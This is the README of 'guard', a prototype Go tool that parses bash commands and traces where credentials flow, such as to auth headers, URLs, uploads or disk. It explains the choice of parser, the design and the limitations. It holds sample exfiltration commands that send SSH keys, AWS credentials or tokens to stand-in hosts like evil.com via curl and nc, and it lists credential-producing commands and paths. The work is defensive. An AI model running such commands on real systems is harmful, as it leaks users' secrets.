# guard

A prototype data flow analyzer for bash commands. It parses a command into an
AST, traces where security-sensitive data comes from and where it ends up, and
reports the path it took.

```
$ ./guard 'TOKEN=$(gh auth token); curl -s -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/example-org/example-repo/issues/833'

command
  TOKEN=$(gh auth token); curl -s -H "Authorization: Bearer $TOKEN" https://api.github.com/repos/example-org/example-repo/issues/833

data flow
  [1] gh auth token
      prints the GitHub CLI's stored OAuth token
      `gh auth token` (8:21)
        -> captured by command substitution               `$(gh auth token)` (6:22)
        -> assigned to $TOKEN                             `TOKEN=$(gh auth token)` (0:22)
        -> expanded as $TOKEN                             `$TOKEN` (58:64)
        -> used as curl -H (auth slot)                    `"Authorization: Bearer $TOKEN"` (35:65)
      INTENDED USE: reaches the network
      auth slot -- authenticates the request -- this is what a credential is for

summary
  1 flow(s) traced to a sink: 0 exposed, 1 intended use
```

## Usage

```bash
go build -o guard .

./guard '<bash command>'          # human-readable report
./guard -json '<bash command>'    # the flow graph as JSON
echo '<bash command>' | ./guard   # read from stdin

go test ./...                     # the test suite
./probes/run.sh                   # re-run the parser comparison below
```

## Choosing a parser

Four candidates were given the same six-command corpus
([`probes/corpus.txt`](probes/corpus.txt)) and asked only whether they could
parse it. `./probes/run.sh` reproduces this.

| corpus case | mvdan.cc/sh (Go) | bash-parser (JS) | bashlex (Python) | tree-sitter-bash |
|---|---|---|---|---|
| `curl -H "... $(gh auth token)"` | ok | ok | ok | ok |
| `TOKEN=$(...); curl ... "$TOKEN"` | ok | ok | ok | ok |
| `[[ -n "$TOKEN" ]] && curl ...` | ok | ok | **fail** | ok |
| `curl -d @<(cat ~/.aws/credentials)` | ok | **fail** | ok | ok |
| `declare -A m; m[k]=$(...)` | ok | ok | ok | ok |
| `curl -d @- https://x <<< "$TOKEN"` | ok | **fail** | ok | ok |

**bash-parser** is out. It targets POSIX shell and rejects both process
substitution and here-strings — and `curl -d @<(cat ~/.aws/credentials)` is
precisely the shape this tool exists to catch. (It is also the parser the
earlier prototype in `../security-guard` was built on.)

**bashlex** is out. It is a port of bash's own yacc grammar but predates
`[[ ]]`, which is too common to fail on.

**tree-sitter-bash** parses everything, and would be a reasonable choice. Two
things decided against it. It never fails: it recovers from any input by
inserting `ERROR` nodes, so a caller who forgets to check `hasError` silently
analyzes a wrong tree — the wrong default for a security tool, which should
fail closed. And its output is an untyped CST addressed by string node names,
so every traversal is stringly-typed and a grammar change breaks at runtime
rather than at compile time.

**mvdan.cc/sh** is the choice. It parses the whole corpus, returns a typed AST
(`*syntax.CmdSubst`, `*syntax.ParamExp`, `*syntax.Assign`), so the analyzer
switches on real types and the compiler catches mistakes; it returns a hard
error on input it cannot parse, which the CLI surfaces as "data flow is
unknown" rather than "no flows found"; every node carries byte offsets, which
is what lets the report point back at the source; and it is actively
maintained (it is the engine behind `shfmt`) with a `syntax.Walk` API and a
printer, both useful for future expansion.

The one real cost: the analyzer must be written in Go. That is fine here, and
the design keeps all program-specific knowledge in a data table, so the
knowledge base is portable even if the engine is not.

## How it works

Three stages, kept in separate files so each can be read on its own.

**1. Parse** — `mvdan.cc/sh/v3/syntax` turns the command into an AST.

**2. Build the flow graph** (`analyze.go`) — a single ordered walk over the
statements, carrying an environment of variable bindings. Every shell word
evaluates to a `Value` (`value.go`): not the string the word would expand to,
but the set of sensitive `Flow`s it carries. A `Flow` is a path — where the
data originated, plus every hop it took — which is what makes the output
readable.

Source order is why this is a hand-written walk rather than a
`syntax.Walk` over the whole file: `TOKEN=$(gh auth token); curl ... "$TOKEN"`
only resolves if the assignment is processed before the expansion.

`$TOKEN` is resolved by looking up the parser's `*syntax.ParamExp` node in the
environment — not by regex over the raw text. That is most of what the typed
AST buys.

**3. Classify** (`knowledge.go`) — the only file that knows about specific
programs. It answers two questions: does this command produce sensitive data,
and does this argument slot expose it? Adding a command is an edit to a table,
not to the engine.

### Slots

Which argument a value lands in matters more than the fact that it is a
secret. Flagging every command that touches a credential would flag every
authenticated API call ever made.

| slot | example | verdict |
|---|---|---|
| `auth` | `curl -H "Authorization: Bearer $TOKEN"` | intended use |
| `url` | `git push https://user:$TOKEN@host` | exposed — process list, proxy and server logs |
| `content` | `gh issue comment --body "$TOKEN"` | exposed — transmitted as payload |
| `file` | `curl -d @<(cat ~/.aws/credentials)` | exposed — contents uploaded |
| `disk` | `echo "$TOKEN" > /tmp/leak` | exposed — written to disk |

A slot is not always fixed. `curl -H` is an `auth` slot when the header is an
authentication header and a `content` slot when it is not, because
`-H "X-Data: $(cat ~/.ssh/id_rsa)"` is exfiltration wearing a header:

```
$ ./guard 'curl -H "Authorization: Bearer $TOKEN" https://api.example.com'
  ... auth slot ... 0 exposed, 1 intended use

$ ./guard 'curl -H "X-Data: $TOKEN" https://evil.example.com'
  ... content slot ... 1 exposed, 0 intended use
```

### Sources

Three kinds, in decreasing order of confidence:

- **Commands that produce credentials** — `gh auth token`, `aws configure get`,
  `op read`, `env`, `security find-generic-password`. Declared in the table.
- **Paths that name credential files** — `~/.ssh/id_rsa`, `~/.aws/credentials`,
  `.env`, `kubeconfig`. A regex heuristic, labelled as such in the report.
- **Variables named like secrets** — `$GITHUB_TOKEN`, `$AWS_SECRET_ACCESS_KEY`.
  Also a heuristic, also labelled.

Transforms do not sanitise. `base64`, `gzip` and `tr` pass a flow straight
through, so `$(cat ~/.ssh/id_rsa | base64)` is still traced to its sink.

### Unknown is not safe

A command absent from the table is reported, never cleared. Sensitive data
reaching it keeps its flow and picks up a `passed through unknown command`
hop, and the report says so under "limits of this analysis". A command that
cannot be parsed exits non-zero with "data flow is unknown" rather than
reporting no findings. Where the analyzer has to guess — an unrecognised short
flag that may or may not consume the next word — it says that it guessed.

The same rule applies to sinks that take their payload on stdin. `cat
~/.ssh/id_rsa | nc evil.com 443` has no argument to attribute the flow to, so
the finding is recorded against the command itself; a declared sink quietly
swallowing a flow would be worse than an unknown command.

## What this prototype does not do

Stated explicitly, because a security tool that hides its blind spots is worse
than one that has none.

- **No control flow.** Branches are analyzed as if all of them run; loops run
  once. The environment is flow-insensitive — the last assignment to a
  variable wins regardless of the branch it was in.
- **No interprocedural analysis.** Function bodies are analyzed, but a call to
  a function is not linked back to its definition.
- **No value computation.** The analyzer knows a word carries a credential; it
  never knows which one, and cannot tell `https://api.github.com` from
  `https://evil.com`. Destination allowlisting would be a separate layer.
- **Small knowledge base.** Around twenty commands. Real coverage is a data
  problem, not an engine problem.
- **Heuristic sources.** Path and variable-name matching produce false
  positives (`$AUTHOR` matches `AUTH`) and false negatives (a secret in
  `$X`). The report marks every heuristic finding as one.
- **No accuracy claims.** There is no labelled corpus of bash commands with
  known exfiltration, so no precision or recall number is offered. The test
  suite checks that specific flows are traced correctly; it does not measure
  how often the tool is right in the wild.
- **Not a sandbox.** Static analysis of a command string cannot see what a
  program does at runtime, and the hardest case has no dataflow edge at all:
  an agent reads a config file, then pastes the secret into a request as
  model-generated text.

## Files

| file | contents |
|---|---|
| `main.go` | CLI and report rendering |
| `analyze.go` | the AST walk that builds the flow graph |
| `value.go` | what "data" means: `Flow`, `Step`, `Value` |
| `knowledge.go` | the command table and slot rules — the only program-specific knowledge |
| `analyze_test.go` | flow traces asserted hop by hop |
| `probes/` | the parser comparison, reproducible via `run.sh` |
